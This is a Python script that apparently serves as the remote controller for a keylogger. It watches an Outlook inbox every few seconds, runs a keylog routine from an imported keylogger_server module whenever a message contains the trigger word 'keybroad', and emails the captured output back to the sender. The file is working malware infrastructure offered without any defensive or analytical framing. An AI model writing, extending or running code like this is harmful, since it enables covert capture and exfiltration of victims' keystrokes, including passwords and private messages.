import time
from datetime import datetime, timedelta
import keylogger_server
import win32com.client

outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")

def sendBack(subject,body,sendTo):
    repMailItem = win32com.client.Dispatch("Outlook.Application").CreateItem(0)
    repMailItem.Subject = subject
    repMailItem.BodyFormat = 1
    repMailItem.Body = body
    repMailItem.To = sendTo

    repMailItem.Display()
    repMailItem.Send()

def listen(msg):
    string = msg.lower()
    rep = ""
    if "keybroad" in string:
        rep = rep + keylogger_server.keylog(string) + "\n"

    return rep

inbox = outlook.GetDefaultFolder(6)
messages = inbox.Items
mailDefault = messages.GetLast()

while True:
    mailNow = messages.GetLast()
    if( mailNow.ReceivedTime > mailDefault.ReceivedTime ):
        rep = listen(mailNow.Body)
        sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
        mailDefault = mailNow
        print(True)
    else:
        print(False)

    #print(mailDefault.Sendername)
    #print(mailDefault.subject)
    #print(mailDefault.Body)
    #print(datetime.now().time())
    #print(mailDefault.ReceivedTime.time())
    #print()
    #print(type(mailDefault.ReceivedTime))
    #print(type(datetime.now().time()))
    #print("____________________")
    time.sleep(5)